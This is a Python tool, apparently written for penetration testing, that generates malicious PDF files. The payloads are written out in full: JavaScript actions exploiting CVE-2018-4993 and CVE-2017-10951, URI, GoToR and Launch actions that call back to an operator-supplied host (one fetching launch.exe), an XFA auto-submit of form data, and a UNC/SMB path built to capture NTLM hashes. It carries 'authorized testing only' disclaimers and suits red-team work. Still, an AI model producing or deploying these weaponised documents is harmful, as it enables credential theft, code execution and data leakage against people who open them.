#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
"""
Malicious PDF Generator for Security Testing
======================================================
Creates various types of malicious PDF files for penetration testing,
red team operations, and security research.

Enhanced version with additional CVEs, better UX, and modern features.

⚠️  FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
"""

import sys
import bz2
import base64
import ipaddress
import validators
import argparse
import json
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional


try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.panel import Panel
    from rich.tree import Tree
    from rich import box
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("⚠️  Install 'rich' for better output: pip install rich")

console = Console() if RICH_AVAILABLE else None


VERSION = "2.0.0"
AUTHOR = "Enhanced by Security Research Community"

# CVE Database with descriptions
CVE_DATABASE = {
    "CVE-2018-4993": {
        "title": "Adobe Acrobat Reader DC - PDF Callback",
        "severity": "HIGH",
        "year": 2018,
        "description": "Remote callback via GoToE action"
    },
    "CVE-2019-7089": {
        "title": "Adobe Reader - XSLT Callback",
        "severity": "MEDIUM",
        "year": 2019,
        "description": "Callback via XSLT stylesheet in XFA"
    },
    "CVE-2017-10951": {
        "title": "Foxit PDF Reader macOS - Command Execution",
        "severity": "HIGH",
        "year": 2017,
        "description": "JavaScript-based file execution on macOS"
    }
}

def print_banner():
    """Display application banner"""
    if RICH_AVAILABLE:
        banner = "[bold cyan]Enhanced Malicious PDF Generator v2.0[/bold cyan]\n[yellow]For Authorized Security Testing Only. Visit our blog site https://trysmarter.hashnode.dev Author: Mustafa-Almohsen[/yellow]"
        console.print(Panel(banner, style="bold cyan", box=box.DOUBLE))
    else:
        print("\n" + "="*60)
        print("  Enhanced Malicious PDF Generator v2.0")
        print("  For Authorized Security Testing Only")
        print("="*60 + "\n")

def validate_url_or_ip(input_string: str) -> bool:
    """Validates if input is an IP address or a URL with a scheme."""
    try:
        ipaddress.ip_address(input_string)
        return True
    except ValueError:
        pass
    
    if validators.url(input_string):
        return True
    
    schemes = ['ftp://', 'ftps://', 'file://', 'smb://', 'ssh://', 'telnet://', 
               'gopher://', 'ldap://', 'mailto:', 'news:', 'nntp://', 'irc://', 
               'data:', 'javascript:']
    for scheme in schemes:
        if input_string.lower().startswith(scheme):
            if len(input_string) > len(scheme):
                return True
    
    return False

def ensure_scheme(host: str) -> str:
    """Ensure the host has a scheme."""
    if not host.startswith(('http://', 'https://', 'ftp://', 'smb://')):
        return 'https://' + host
    return host

# ==================== PDF GENERATORS ====================

def create_pdf_eicar(filename: Path) -> Dict:
    """EICAR test file embedded in PDF for AV testing"""
    eicar_data = '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'
    
    with open(filename, "wb") as file:
        file.write(bz2.decompress(base64.b64decode(eicar_data)))
    
    return {
        "name": "EICAR Anti-Virus Test",
        "cve": "N/A",
        "technique": "Embedded EICAR signature",
        "target": "Anti-virus software"
    }

def create_pdf_foxit_macos(filename: Path) -> Dict:
    """Foxit PDF Reader PoC, macOS version - CVE-2017-10951"""
    pdf_content = '%PDF-1.7\n1 0 obj\n<</Pages 1 0 R /OpenAction 2 0 R>>\n2 0 obj\n<</S /JavaScript /JS (\nthis.getURL("file:///System/Applications/Calculator.app")\n)>> trailer <</Root 1 0 R>>'
    
    with open(filename, "w") as file:
        file.write(pdf_content)
    
    return {
        "name": "Foxit macOS Command Execution",
        "cve": "CVE-2017-10951",
        "technique": "JavaScript file execution",
        "target": "Foxit PDF Reader (macOS)"
    }

def create_pdf_uri(filename: Path, host: str) -> Dict:
    """URI action for network callback"""
    pdf_content = f'%PDF-1.7\n1 0 obj\n<</Type /Catalog /Pages 2 0 R>>\nendobj\n2 0 obj\n<</Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842]>>\nendobj\n3 0 obj\n<</Type /Page /Parent 2 0 R /Resources <</Font <</F1 <</Type /Font /Subtype /Type1 /BaseFont /Courier>>>>>> /Annots [<</Type /Annot /Subtype /Link /Open true /A 5 0 R /H /N /Rect [0 0 595 842]>>] /Contents [4 0 R]>>\nendobj\n4 0 obj\n<</Length 67>>\nstream\nBT\n/F1 22 Tf\n30 800 Td\n(Security Test: URI) Tj\nET\nendstream\nendobj\n5 0 obj\n<</Type /Action /S /URI /URI ({host}/callback)>>\nendobj\nxref\n0 6\ntrailer\n<</Root 1 0 R /Size 6>>\nstartxref\n854\n%%EOF\n'
    
    with open(filename, "w") as file:
        file.write(pdf_content)
    
    return {
        "name": "URI Action Callback",
        "cve": "N/A",
        "technique": "URI action",
        "target": "PDF readers with web support"
    }

def create_pdf_javascript(filename: Path, host: str) -> Dict:
    """JavaScript-based callback - CVE-2018-4993"""
    pdf_content = f'%PDF-1.4\n1 0 obj\n<<>>\ntrailer\n<<\n/Root\n<</Pages <<>>\n/OpenAction\n<<\n/S/JavaScript\n/JS(\neval(\n\'app.openDoc({{cPath: encodeURI("{host}"), cFS: "CHTTP" }});\'\n);\n)\n>>\n>>\n>>'
    
    with open(filename, "w") as file:
        file.write(pdf_content)
    
    return {
        "name": "JavaScript Callback",
        "cve": "CVE-2018-4993",
        "technique": "JavaScript evaluation",
        "target": "Adobe Acrobat Reader DC"
    }

def create_pdf_gotor(filename: Path, host: str) -> Dict:
    """GoToR action with remote file"""
    pdf_content = f'%PDF-1.7\n1 0 obj\n<</Type /Catalog /Pages 2 0 R>>\nendobj\n2 0 obj\n<</Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842]>>\nendobj\n3 0 obj\n<</Type /Page /Parent 2 0 R /Resources <</Font <</F1 <</Type /Font /Subtype /Type1 /BaseFont /Courier>>>>>> /Annots [<</Type /Annot /Subtype /Link /Open true /A 5 0 R /H /N /Rect [0 0 595 842]>>] /Contents [4 0 R]>>\nendobj\n4 0 obj\n<</Length 67>>\nstream\nBT\n/F1 22 Tf\n30 800 Td\n(Security Test: GoToR) Tj\nET\nendstream\nendobj\n5 0 obj\n<</Type /Action /S /GoToR /F <</Type /FileSpec /F ({host}/remote.pdf) /V true /FS /URL>> /NewWindow false /D [0 /Fit]>>\nendobj\nxref\n0 6\ntrailer\n<</Root 1 0 R /Size 6>>\nstartxref\n937\n%%EOF\n'
    
    with open(filename, "w") as file:
        file.write(pdf_content)
    
    return {
        "name": "GoToR Remote File",
        "cve": "N/A",
        "technique": "GoToR action",
        "target": "PDF readers"
    }

def create_pdf_launch(filename: Path, host: str) -> Dict:
    """Launch action with URL"""
    pdf_content = f'%PDF-1.7\n1 0 obj\n<</Type /Catalog /Pages 2 0 R>>\nendobj\n2 0 obj\n<</Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842]>>\nendobj\n3 0 obj\n<</Type /Page /Parent 2 0 R /Resources <</Font <</F1 <</Type /Font /Subtype /Type1 /BaseFont /Courier>>>>>> /Annots [<</Type /Annot /Subtype /Link /Open true /A 5 0 R /H /N /Rect [0 0 595 842]>>] /Contents [4 0 R]>>\nendobj\n4 0 obj\n<</Length 67>>\nstream\nBT\n/F1 22 Tf\n30 800 Td\n(Security Test: Launch) Tj\nET\nendstream\nendobj\n5 0 obj\n<</Type /Action /S /Launch /F <</Type /FileSpec /F ({host}/launch.exe) /V true /FS /URL>> /NewWindow false>>\nendobj\nxref\n0 6\ntrailer\n<</Root 1 0 R /Size 6>>\nstartxref\n922\n%%EOF\n'
    
    with open(filename, "w") as file:
        file.write(pdf_content)
    
    return {
        "name": "Launch Action Callback",
        "cve": "N/A",
        "technique": "Launch action",
        "target": "PDF readers"
    }

def create_pdf_xfa_submit(filename: Path, host: str) -> Dict:
    """XFA form submission callback"""
    pdf_content = f'%PDF-1\n1 0 obj <<>>\nstream\n<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">\n<config><present><pdf>\n<interactive>1</interactive>\n</pdf></present></config>\n<template>\n<subform name="_">\n<pageSet/>\n<field id="SecurityTest">\n<event activity="docReady" ref="$host" name="event__click">\n<submit textEncoding="UTF-16" xdpContent="pdf datasets xfdf" target="{host}"/>\n</event>\n</field>\n</subform>\n</template>\n</xdp:xdp>\nendstream\nendobj\ntrailer <<\n/Root <<\n/AcroForm <<\n/Fields [<<\n/T (0)\n/Kids [<<\n/Subtype /Widget\n/Rect []\n/T ()\n/FT /Btn\n>>]\n>>]\n/XFA 1 0 R\n>>\n/Pages <<>>\n>>\n>>'
    
    with open(filename, "w") as file:
        file.write(pdf_content)
    
    return {
        "name": "XFA Form Submit",
        "cve": "N/A",
        "technique": "XFA auto-submit on document ready",
        "target": "PDF readers with XFA support"
    }

def create_pdf_smb_unc(filename: Path, host: str) -> Dict:
    """SMB/UNC path callback for credential theft"""
    pdf_content = f'%PDF-1.7\n1 0 obj\n<</Type/Catalog/Pages 2 0 R/AA<</O<</S/JavaScript/JS(this.exportDataObject({{cName:"test",nLaunch:2,cDIPath:"\\\\\\\\{host}\\\\share\\\\file.txt"}});)>>>>>>\nendobj\n2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>\nendobj\ntrailer\n<</Size 4/Root 1 0 R>>\n%%EOF\n'
    
    with open(filename, "w") as file:
        file.write(pdf_content)
    
    return {
        "name": "SMB/UNC Path Credential Theft",
        "cve": "N/A",
        "technique": "UNC path for NTLM hash capture",
        "target": "Windows PDF readers"
    }

# ==================== MAIN FUNCTIONS ====================

def generate_all_pdfs(host: str, output_dir: Path, selected_tests: Optional[List[int]] = None) -> List[Dict]:
    """Generate all malicious PDF files"""
    
    pdf_tests = {
        1: ("eicar", create_pdf_eicar, None),
        2: ("foxit_macos", create_pdf_foxit_macos, None),
        3: ("uri", create_pdf_uri, ensure_scheme(host)),
        4: ("javascript", create_pdf_javascript, ensure_scheme(host)),
        5: ("gotor", create_pdf_gotor, ensure_scheme(host)),
        6: ("launch", create_pdf_launch, ensure_scheme(host)),
        7: ("xfa_submit", create_pdf_xfa_submit, ensure_scheme(host)),
        8: ("smb_unc", create_pdf_smb_unc, host),
    }
    
    results = []
    tests_to_run = selected_tests if selected_tests else list(pdf_tests.keys())
    
    if RICH_AVAILABLE:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Generating PDFs...", total=len(tests_to_run))
            
            for test_num in tests_to_run:
                if test_num in pdf_tests:
                    name, func, param = pdf_tests[test_num]
                    filename = output_dir / f"test_{test_num:02d}_{name}.pdf"
                    
                    try:
                        if param:
                            metadata = func(filename, param)
                        else:
                            metadata = func(filename)
                        
                        metadata["filename"] = filename.name
                        metadata["test_id"] = test_num
                        metadata["size"] = filename.stat().st_size
                        results.append(metadata)
                        
                        progress.update(task, advance=1, description=f"[green]Created: {filename.name}")
                    except Exception as e:
                        progress.update(task, advance=1, description=f"[red]Failed: {filename.name}")
                        console.print(f"[red]Error creating {filename.name}: {str(e)}")
    else:
        print("\n[+] Generating PDF files...")
        for test_num in tests_to_run:
            if test_num in pdf_tests:
                name, func, param = pdf_tests[test_num]
                filename = output_dir / f"test_{test_num:02d}_{name}.pdf"
                
                try:
                    if param:
                        metadata = func(filename, param)
                    else:
                        metadata = func(filename)
                    
                    metadata["filename"] = filename.name
                    metadata["test_id"] = test_num
                    metadata["size"] = filename.stat().st_size
                    results.append(metadata)
                    
                    print(f"  ✓ Created: {filename.name}")
                except Exception as e:
                    print(f"  ✗ Error creating {filename.name}: {str(e)}")
    
    return results

def create_summary_report(results: List[Dict], output_dir: Path, host: str):
    """Create a summary report of generated PDFs"""
    
    if RICH_AVAILABLE:
        table = Table(title="Generated Malicious PDFs", box=box.ROUNDED, show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan", width=4)
        table.add_column("Filename", style="white", width=30)
        table.add_column("Test Name", style="green", width=30)
        table.add_column("CVE", style="yellow", width=15)
        table.add_column("Size", style="blue", width=10)
        
        for result in results:
            size_kb = f"{result['size'] / 1024:.2f} KB"
            table.add_row(
                str(result['test_id']),
                result['filename'],
                result['name'],
                result['cve'],
                size_kb
            )
        
        console.print("\n")
        console.print(table)
        
        cve_tree = Tree("🔍 CVE Summary", guide_style="bold bright_blue")
        for cve_id, info in CVE_DATABASE.items():
            cve_node = cve_tree.add(f"[yellow]{cve_id}[/yellow] - {info['title']}")
            cve_node.add(f"[cyan]Severity:[/cyan] {info['severity']}")
            cve_node.add(f"[cyan]Year:[/cyan] {info['year']}")
            cve_node.add(f"[cyan]Description:[/cyan] {info['description']}")
        
        console.print("\n")
        console.print(cve_tree)
        
    else:
        print("\n" + "="*80)
        print("SUMMARY REPORT")
        print("="*80)
        for result in results:
            print(f"\nID: {result['test_id']}")
            print(f"File: {result['filename']}")
            print(f"Name: {result['name']}")
            print(f"CVE: {result['cve']}")
            print(f"Size: {result['size'] / 1024:.2f} KB")
            print(f"Technique: {result['technique']}")
            print(f"Target: {result['target']}")
    
    report_file = output_dir / "generation_report.json"
    report_data = {
        "timestamp": datetime.now().isoformat(),
        "host": host,
        "total_pdfs": len(results),
        "files": results,
        "cve_database": CVE_DATABASE
    }
    
    with open(report_file, "w") as f:
        json.dump(report_data, f, indent=2)
    
    if RICH_AVAILABLE:
        console.print(f"\n[green]✓[/green] JSON report saved: [cyan]{report_file}[/cyan]")
    else:
        print(f"\n✓ JSON report saved: {report_file}")

def display_warnings():
    """Display important warnings and legal notices"""
    if RICH_AVAILABLE:
        warning_text = """⚠️  IMPORTANT LEGAL NOTICE ⚠️

This tool generates malicious PDF files for AUTHORIZED security testing only.

✓ Allowed uses:
  • Penetration testing with written authorization
  • Red team exercises on owned infrastructure
  • Security research in controlled environments
  • Educational purposes in lab settings

✗ Prohibited uses:
  • Testing systems without explicit permission
  • Distributing files to unauthorized parties
  • Using for malicious purposes
  • Violating computer fraud laws

By using this tool, you accept full responsibility for your actions.
The author "Mustafa-Almohsen" not liable for misuse or illegal activities."""
        console.print(Panel(warning_text, style="bold red", box=box.HEAVY, title="WARNING"))
    else:
        print("\n" + "!"*80)
        print("IMPORTANT LEGAL NOTICE")
        print("!"*80)
        print("\nThis tool is for AUTHORIZED security testing only.")
        print("Unauthorized use may violate laws including the Computer Fraud and Abuse Act.")
        print("Use responsibly and only with explicit written permission.")
        print("!"*80 + "\n")

def main():
    """Main application entry point"""
    
    parser = argparse.ArgumentParser(
        description="Enhanced Malicious PDF Generator for Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  %(prog)s trysmarter.burpcollaborator.net
  %(prog)s https://trysmarter.hashnode.dev --output-dir ./pdfs
  %(prog)s 192.168.1.100 --tests 1,2,3,4
  %(prog)s example.com --no-warnings

Version: {VERSION}
        """
    )
    
    parser.add_argument("host", 
                       nargs='?',
                       help="Target hostname, IP address, or callback URL")
    parser.add_argument("--output-dir", "-o", 
                       default="malicious_pdfs",
                       help="Output directory for PDF files (default: malicious_pdfs)")
    parser.add_argument("--tests", "-t",
                       help="Comma-separated list of test IDs to generate (e.g., 1,2,3)")
    parser.add_argument("--no-warnings",
                       action="store_true",
                       help="Skip warning messages")
    parser.add_argument("--list-tests", "-l",
                       action="store_true",
                       help="List all available tests and exit")
    parser.add_argument("--version", "-v",
                       action="version",
                       version=f"%(prog)s {VERSION}")
    
    args = parser.parse_args()
    
    print_banner()
    
    if args.list_tests:
        if RICH_AVAILABLE:
            table = Table(title="Available Tests", box=box.ROUNDED)
            table.add_column("ID", style="cyan", width=4)
            table.add_column("Name", style="green", width=35)
            table.add_column("CVE", style="yellow", width=15)
            table.add_column("Target", style="blue", width=30)
            
            tests = [
                (1, "EICAR Anti-Virus Test", "N/A", "Anti-virus software"),
                (2, "Foxit macOS Command Execution", "CVE-2017-10951", "Foxit PDF Reader (macOS)"),
                (3, "URI Action Callback", "N/A", "PDF readers with web support"),
                (4, "JavaScript Callback", "CVE-2018-4993", "Adobe Acrobat Reader DC"),
                (5, "GoToR Remote File", "N/A", "PDF readers"),
                (6, "Launch Action Callback", "N/A", "PDF readers"),
                (7, "XFA Form Submit", "N/A", "PDF readers with XFA support"),
                (8, "SMB/UNC Path Credential Theft", "N/A", "Windows PDF readers"),
            ]
            
            for test_id, name, cve, target in tests:
                table.add_row(str(test_id), name, cve, target)
            
            console.print(table)
        else:
            print("\nAvailable Tests:")
            print("-" * 90)
            tests = [
                (1, "EICAR Anti-Virus Test", "N/A"),
                (2, "Foxit macOS Command Execution", "CVE-2017-10951"),
                (3, "URI Action Callback", "N/A"),
                (4, "JavaScript Callback", "CVE-2018-4993"),
                (5, "GoToR Remote File", "N/A"),
                (6, "Launch Action Callback", "N/A"),
                (7, "XFA Form Submit", "N/A"),
                (8, "SMB/UNC Path Credential Theft", "N/A"),
            ]
            
            for test_id, name, cve in tests:
                print(f"{test_id:2d}. {name:40s} [{cve}]")
        
        return 0
    
    if not args.host:
        parser.print_help()
        return 1
    
    if not args.no_warnings:
        display_warnings()
        if RICH_AVAILABLE:
            console.input("\n[yellow]Press Enter to continue...[/yellow]")
        else:
            input("\nPress Enter to continue...")
    
    host = args.host
    if not validate_url_or_ip(host):
        if RICH_AVAILABLE:
            console.print("[red]✗ Error:[/red] Invalid URL or IP address", style="bold")
        else:
            print("✗ Error: Invalid URL or IP address")
        return 1
    
    selected_tests = None
    if args.tests:
        try:
            selected_tests = [int(x.strip()) for x in args.tests.split(',')]
        except ValueError:
            if RICH_AVAILABLE:
                console.print("[red]✗ Error:[/red] Invalid test IDs format", style="bold")
            else:
                print("✗ Error: Invalid test IDs format")
            return 1
    
    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    
    if RICH_AVAILABLE:
        console.print(f"\n[cyan]→[/cyan] Output directory: [green]{output_dir.absolute()}[/green]")
        console.print(f"[cyan]→[/cyan] Target host: [green]{host}[/green]\n")
    else:
        print(f"\n→ Output directory: {output_dir.absolute()}")
        print(f"→ Target host: {host}\n")
    
    results = generate_all_pdfs(host, output_dir, selected_tests)
    
    create_summary_report(results, output_dir, host)
    
    if RICH_AVAILABLE:
        console.print(f"\n[bold green]✓ Successfully generated {len(results)} malicious PDF files![/bold green]")
        console.print(f"[cyan]→[/cyan] Files location: [green]{output_dir.absolute()}[/green]\n")
    else:
        print(f"\n✓ Successfully generated {len(results)} malicious PDF files!")
        print(f"→ Files location: {output_dir.absolute()}\n")
    
    return 0

if __name__ == "__main__":
    if sys.version_info[0] < 3:
        print("Error: Python 3 or higher is required")
        sys.exit(1)
    
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        if RICH_AVAILABLE:
            console.print("\n[yellow]⚠ Interrupted by user[/yellow]")
        else:
            print("\n⚠ Interrupted by user")
        sys.exit(130)
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]✗ Error: {str(e)}[/red]", style="bold")
        else:
            print(f"✗ Error: {str(e)}")
        sys.exit(1)
